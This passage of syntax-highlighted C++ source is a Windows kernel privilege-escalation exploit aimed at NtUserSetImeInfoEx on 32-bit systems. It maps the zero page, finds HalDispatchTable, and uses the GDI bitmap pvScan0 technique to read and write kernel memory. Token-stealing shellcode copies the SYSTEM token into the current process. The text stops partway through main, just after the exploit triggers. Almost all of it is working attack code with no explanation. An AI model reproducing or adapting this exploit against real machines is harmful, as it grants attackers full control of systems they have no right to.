 <span class="n">SystemProcessorStatistics</span><span class="p">,</span> <span class="c1">// 23 Y N</span>
 <span class="n">SystemDpcInformation</span><span class="p">,</span> <span class="c1">// 24 Y Y</span>
 <span class="n">SystemNotImplemented6</span><span class="p">,</span> <span class="c1">// 25 Y N</span>
 <span class="n">SystemLoadImage</span><span class="p">,</span> <span class="c1">// 26 N Y</span>
 <span class="n">SystemUnloadImage</span><span class="p">,</span> <span class="c1">// 27 N Y</span>
 <span class="n">SystemTimeAdjustment</span><span class="p">,</span> <span class="c1">// 28 Y Y</span>
 <span class="n">SystemNotImplemented7</span><span class="p">,</span> <span class="c1">// 29 Y N</span>
 <span class="n">SystemNotImplemented8</span><span class="p">,</span> <span class="c1">// 30 Y N</span>
 <span class="n">SystemNotImplemented9</span><span class="p">,</span> <span class="c1">// 31 Y N</span>
 <span class="n">SystemCrashDumpInformation</span><span class="p">,</span> <span class="c1">// 32 Y N</span>
 <span class="n">SystemExceptionInformation</span><span class="p">,</span> <span class="c1">// 33 Y N</span>
 <span class="n">SystemCrashDumpStateInformation</span><span class="p">,</span> <span class="c1">// 34 Y Y/N</span>
 <span class="n">SystemKernelDebuggerInformation</span><span class="p">,</span> <span class="c1">// 35 Y N</span>
 <span class="n">SystemContextSwitchInformation</span><span class="p">,</span> <span class="c1">// 36 Y N</span>
 <span class="n">SystemRegistryQuotaInformation</span><span class="p">,</span> <span class="c1">// 37 Y Y</span>
 <span class="n">SystemLoadAndCallImage</span><span class="p">,</span> <span class="c1">// 38 N Y</span>
 <span class="n">SystemPrioritySeparation</span><span class="p">,</span> <span class="c1">// 39 N Y</span>
 <span class="n">SystemNotImplemented10</span><span class="p">,</span> <span class="c1">// 40 Y N</span>
 <span class="n">SystemNotImplemented11</span><span class="p">,</span> <span class="c1">// 41 Y N</span>
 <span class="n">SystemInvalidInfoClass2</span><span class="p">,</span> <span class="c1">// 42</span>
 <span class="n">SystemInvalidInfoClass3</span><span class="p">,</span> <span class="c1">// 43</span>
 <span class="n">SystemTimeZoneInformation</span><span class="p">,</span> <span class="c1">// 44 Y N</span>
 <span class="n">SystemLookasideInformation</span><span class="p">,</span> <span class="c1">// 45 Y N</span>
 <span class="n">SystemSetTimeSlipEvent</span><span class="p">,</span> <span class="c1">// 46 N Y</span>
 <span class="n">SystemCreateSession</span><span class="p">,</span> <span class="c1">// 47 N Y</span>
 <span class="n">SystemDeleteSession</span><span class="p">,</span> <span class="c1">// 48 N Y</span>
 <span class="n">SystemInvalidInfoClass4</span><span class="p">,</span> <span class="c1">// 49</span>
 <span class="n">SystemRangeStartInformation</span><span class="p">,</span> <span class="c1">// 50 Y N</span>
 <span class="n">SystemVerifierInformation</span><span class="p">,</span> <span class="c1">// 51 Y Y</span>
 <span class="n">SystemAddVerifier</span><span class="p">,</span> <span class="c1">// 52 N Y</span>
 <span class="n">SystemSessionProcessesInformation</span> <span class="c1">// 53 Y N</span>
<span class="p">}</span><span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">;</span>
<span class="kr">__declspec</span><span class="p">(</span><span class="kr">naked</span><span class="p">)</span> <span class="kt">void</span> <span class="n">NtUserSetImeInfoEx</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">tmp</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">_asm</span> <span class="p">{</span>
		<span class="n">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="n">tmp</span><span class="p">;</span>
		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x1226</span><span class="p">;</span>
		<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x7ffe0300</span><span class="p">;</span>
		<span class="n">call</span> <span class="n">dword</span> <span class="n">ptr</span><span class="p">[</span><span class="n">edx</span><span class="p">];</span>
		<span class="n">ret</span> <span class="mi">4</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="k">using</span> <span class="n">pNtAllocateVirtualMemory</span> <span class="o">=</span> <span class="n">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span><span class="p">)(</span>
	<span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">PVOID</span> <span class="n">BaseAddress</span><span class="p">,</span>
	<span class="n">ULONG_PTR</span> <span class="n">ZeroBits</span><span class="p">,</span>
	<span class="n">PSIZE_T</span> <span class="n">RegionSize</span><span class="p">,</span>
	<span class="n">ULONG</span> <span class="n">AllocateType</span><span class="p">,</span>
	<span class="n">ULONG</span> <span class="n">Protect</span>
<span class="p">);</span>
<span class="k">using</span> <span class="n">pZwQuerySystemInformation</span> <span class="o">=</span> <span class="n">NTSTATUS</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="p">)(</span>
  <span class="n">SYSTEM_INFORMATION_CLASS</span> <span class="n">SystemInformationClass</span><span class="p">,</span>
  <span class="n">PVOID</span>                    <span class="n">SystemInformation</span><span class="p">,</span>
  <span class="n">ULONG</span>                    <span class="n">SystemInformationLength</span><span class="p">,</span>
  <span class="n">PULONG</span>                   <span class="n">ReturnLength</span>
<span class="p">);</span>
<span class="k">typedef</span> <span class="n">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtQueryIntervalProfile</span><span class="p">)(</span>
	<span class="n">IN</span> <span class="n">ULONG</span>   <span class="n">ProfileSource</span><span class="p">,</span>
    <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">Interval</span>
<span class="p">);</span>
<span class="n">VOID</span> <span class="n">ReadOOB</span><span class="p">(</span><span class="n">HBITMAP</span> <span class="n">hManager</span><span class="p">,</span><span class="n">HBITMAP</span> <span class="n">hWorker</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">writeAddr</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">readValue</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">SetBitmapBits</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span><span class="n">len</span><span class="p">,</span><span class="o">&amp;</span><span class="n">writeAddr</span><span class="p">);</span>
  <span class="n">GetBitmapBits</span><span class="p">(</span><span class="n">hWorker</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">readValue</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">VOID</span> <span class="n">WriteOOB</span><span class="p">(</span><span class="n">HBITMAP</span> <span class="n">hManager</span><span class="p">,</span> <span class="n">HBITMAP</span> <span class="n">hWorker</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">writeAddr</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">writeValue</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">SetBitmapBits</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">writeAddr</span><span class="p">);</span>
  <span class="n">SetBitmapBits</span><span class="p">(</span><span class="n">hWorker</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">writeValue</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="n">RepoErrorExit</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">msg</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Error "</span> <span class="o">&lt;&lt;</span> <span class="n">msg</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span> 
	<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="n">RepoSuccess</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">msg</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] "</span> <span class="o">&lt;&lt;</span> <span class="n">msg</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="kr">__declspec</span><span class="p">(</span><span class="kr">naked</span><span class="p">)</span> <span class="n">GetSystemToken</span><span class="p">()</span>
 <span class="p">{</span>
     <span class="kr">__asm</span>
     <span class="p">{</span>
         <span class="n">pushad</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span><span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x124</span><span class="p">]</span>  <span class="c1">//CurrentThread</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x150</span><span class="p">]</span> <span class="c1">//Process  </span>
         <span class="n">lea</span> <span class="n">edx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xf8</span><span class="p">]</span>  <span class="c1">//MyProcess.Token</span>
 <span class="nl">noFind:</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">]</span>  <span class="c1">//Eprocess.ActiveProcessLinks</span>
         <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span><span class="mh">0xb8</span>        <span class="c1">//next Eprocess struct</span>
         <span class="n">mov</span> <span class="n">ebx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xb4</span><span class="p">]</span>  <span class="c1">//PID</span>
         <span class="n">cmp</span> <span class="n">ebx</span><span class="p">,</span><span class="mi">4</span>
         <span class="n">jnz</span> <span class="n">noFind</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xf8</span><span class="p">]</span>    <span class="c1">//System.Token</span>
         <span class="n">mov</span> <span class="p">[</span><span class="n">edx</span><span class="p">],</span><span class="n">eax</span>
         <span class="n">lock</span> <span class="n">inc</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
         <span class="n">lock</span> <span class="n">inc</span><span class="p">[</span><span class="n">eax</span><span class="p">]</span>
         <span class="n">popad</span>
         <span class="n">ret</span>
     <span class="p">}</span>
 <span class="p">}</span>
<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">GetNtoskrnl</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hNtdll</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">auto</span> <span class="n">ZwQuerySystemInformation</span> <span class="o">=</span> <span class="p">(</span><span class="n">pZwQuerySystemInformation</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">,</span> <span class="s">"ZwQuerySystemInformation"</span><span class="p">);</span>
	<span class="n">SIZE_T</span> <span class="n">SysModLen</span><span class="p">;</span>
	<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">SysModuleInfo</span><span class="p">;</span>
	<span class="n">ZwQuerySystemInformation</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">SysModLen</span><span class="p">);</span>
	<span class="n">SysModuleInfo</span> <span class="o">=</span> <span class="p">(</span><span class="k">decltype</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">))</span><span class="n">malloc</span><span class="p">(</span><span class="n">SysModLen</span><span class="p">);</span>
	<span class="n">ZwQuerySystemInformation</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="n">SysModuleInfo</span><span class="p">,</span> <span class="n">SysModLen</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">SysModLen</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">GetLastError</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"ZwQuerySystemInformation Function Fail..."</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">SysModuleInfo</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">LPCSTR</span> <span class="kr">inline</span> <span class="n">GetNtoskrnlName</span><span class="p">(</span><span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">sysinfo</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">LPCSTR</span> <span class="n">NtoskrnlName</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">sysinfo</span><span class="o">-&gt;</span><span class="n">Module</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">FullPathName</span><span class="p">,</span><span class="sc">'\\'</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
	<span class="k">return</span> <span class="n">NtoskrnlName</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">PVOID</span> <span class="kr">inline</span> <span class="n">GetNtoskrnlBase</span><span class="p">(</span><span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">sysinfo</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="n">sysinfo</span><span class="o">-&gt;</span><span class="n">Module</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">ImageBase</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">DWORD</span> <span class="kr">inline</span> <span class="n">GetPeb</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">DWORD</span> <span class="n">teb</span> <span class="o">=</span> <span class="n">__readfsdword</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
	<span class="n">DWORD</span> <span class="n">peb</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">teb</span><span class="p">)</span><span class="o">+</span><span class="mh">0x30</span><span class="p">);</span>
<span class="cp">#ifdef DEBUG
</span>	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] Teb: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">teb</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] Peb: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">peb</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
<span class="cp">#endif
</span>	<span class="k">return</span> <span class="n">peb</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">HMODULE</span> <span class="n">hNtdll</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hNtdll</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hNtdll</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"cannot open ntdll.dll..."</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">SysModuleInfo</span> <span class="o">=</span> <span class="n">GetNtoskrnl</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">);</span>
	<span class="n">PVOID</span> <span class="n">NtoskrnlBase</span> <span class="o">=</span> <span class="n">GetNtoskrnlBase</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">);</span>
	<span class="n">LPCSTR</span> <span class="n">NtoskrnlName</span> <span class="o">=</span> <span class="n">GetNtoskrnlName</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">);</span>
	<span class="n">RepoSuccess</span><span class="p">(</span><span class="n">NtoskrnlName</span><span class="p">);</span>
	<span class="n">HMODULE</span> <span class="n">hNtoskrnl</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="n">NtoskrnlName</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hNtoskrnl</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hNtoskrnl</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"cannot load Ntoskrnl.exe..."</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">free</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">);</span>
	<span class="n">PVOID</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hNtoskrnl</span><span class="p">,</span> <span class="s">"HalDispatchTable"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">GetLastError</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"Cannot find HalDispatchTable..."</span><span class="p">);</span>
<span class="cp">#ifdef DEBUG
</span>		<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"GetLastError value: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">else</span> <span class="p">{</span>
		<span class="n">RepoSuccess</span><span class="p">(</span><span class="s">"Find HalDispatchTable Success!"</span><span class="p">);</span>
	
<span class="cp">#endif // DEBUG
</span>	<span class="p">}</span>

	<span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">-</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">hNtoskrnl</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">NtoskrnlBase</span><span class="p">);</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] HalDispatchTable: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">HalDispatchTable</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>

	<span class="cm">/* 分配零页虚拟内存 */</span>
	<span class="k">auto</span> <span class="n">NtAllocateVirutalMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">pNtAllocateVirtualMemory</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">,</span> <span class="s">"NtAllocateVirtualMemory"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">GetLastError</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"Cannot find NtAllocateVirtualMemory..."</span><span class="p">);</span>
	<span class="p">}</span>
<span class="cp">#ifdef DEBUG
</span>	<span class="k">else</span> <span class="p">{</span>
		<span class="n">RepoSuccess</span><span class="p">(</span><span class="s">"Find NtAllocateVirtualMemory Success!"</span><span class="p">);</span>
	<span class="p">}</span>
<span class="cp">#endif
</span>	<span class="n">DWORD</span> <span class="n">BaseAddr</span> <span class="o">=</span> <span class="mh">0x2</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">RegionSize</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
	<span class="n">NtAllocateVirutalMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">BaseAddr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RegionSize</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x90</span> <span class="p">};</span>
	<span class="n">HBITMAP</span> <span class="n">hWorker</span> <span class="o">=</span> <span class="n">CreateBitmap</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
	<span class="n">HBITMAP</span> <span class="n">hManager</span> <span class="o">=</span> <span class="n">CreateBitmap</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
	<span class="k">constexpr</span> <span class="n">DWORD</span> <span class="n">GdiSharedHandleTable_offset</span> <span class="o">=</span> <span class="mh">0x094</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">peb</span> <span class="o">=</span> <span class="n">GetPeb</span><span class="p">();</span>
	<span class="n">pGdiCell</span> <span class="n">GdiHandleTable</span> <span class="o">=</span> <span class="p">(</span><span class="n">pGdiCell</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)((</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="n">peb</span> <span class="o">+</span> <span class="n">GdiSharedHandleTable_offset</span><span class="p">));</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] GdiHandleTable: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">GdiHandleTable</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="n">pGdiCell</span> <span class="n">work_cell</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">GdiHandleTable</span><span class="p">[(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">hWorker</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">];</span>
	<span class="n">pGdiCell</span> <span class="n">manage_cell</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">GdiHandleTable</span><span class="p">[(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">hManager</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">];</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] worker GdiCell: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">work_cell</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] manager GdiCell: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">manage_cell</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">worker_krnl_addr</span> <span class="o">=</span> <span class="n">work_cell</span><span class="o">-&gt;</span><span class="n">pKernelAddress</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">manager_krnl_addr</span> <span class="o">=</span> <span class="n">manage_cell</span><span class="o">-&gt;</span><span class="n">pKernelAddress</span><span class="p">;</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] worker kernel address: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">worker_krnl_addr</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] manager kernel address: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">manager_krnl_addr</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">surfobj_offset</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">pvscan0_offset</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">w_pvscan0</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">worker_krnl_addr</span> <span class="o">+</span> <span class="n">surfobj_offset</span> <span class="o">+</span> <span class="n">pvscan0_offset</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">m_pvscan0</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">manager_krnl_addr</span> <span class="o">+</span> <span class="n">surfobj_offset</span> <span class="o">+</span> <span class="n">pvscan0_offset</span><span class="p">;</span>
	<span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="mi">512</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
<span class="cp">#define API_BITMAP 0x04000000
#define SHAREACCESS_SURFACE 0x00000200
#define DDB_SURFACE 0x00800000
#define STYPE_BITMAP 0L
#define BMF_TOPDOWN 0x1
#define BMF_32BPP 0x6
</span>	<span class="n">PDWORD</span> <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
	<span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">w_pvscan0</span><span class="p">;</span>           <span class="c1">// pvScan0 : Worker pvScan0</span>
	<span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x180</span><span class="p">;</span>               <span class="c1">// lDelta : 0x180</span>
	<span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xabcd</span><span class="p">;</span>              <span class="c1">// iUniq : 0xabcd</span>
	<span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">BMF_32BPP</span><span class="p">;</span>           <span class="c1">// iBitmapFormat : BMF_32BPP</span>
	<span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">STYPE_BITMAP</span><span class="p">;</span>        <span class="c1">// iType : STYPE_BITMAP</span>
	<span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">|=</span> <span class="n">BMF_TOPDOWN</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">;</span>  <span class="c1">// fjBitmap : BMF_TOPDOWN</span>
	<span class="n">p</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4800200</span><span class="p">;</span>           <span class="c1">// flags : API_BITMAP | SHAREACCESS_SURFACE | DDB_SURFACE</span>

	<span class="n">PDWORD</span> <span class="n">tmp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">tmp</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="n">m_pvscan0</span><span class="p">;</span>   <span class="c1">// arbitrary write addr : Manager pvScan0</span>
	<span class="n">tmp</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">w_pvscan0</span><span class="p">;</span>  <span class="c1">// if ( v3[5] != *a2 ) {...} bypass</span>
	<span class="n">HWINSTA</span> <span class="n">hWinsta</span> <span class="o">=</span> <span class="n">CreateWindowStationA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">READ_CONTROL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
	<span class="n">SetProcessWindowStation</span><span class="p">(</span><span class="n">hWinsta</span><span class="p">);</span>
	<span class="n">NtUserSetImeInfoEx</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
	<span class="n">RepoSuccess</span><span class="p">(</span><span class="s">"Exploit Success!"</span><span class="p">);</span>
	<span class="n">DWORD</span> <span class="n">oldHalEntry</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
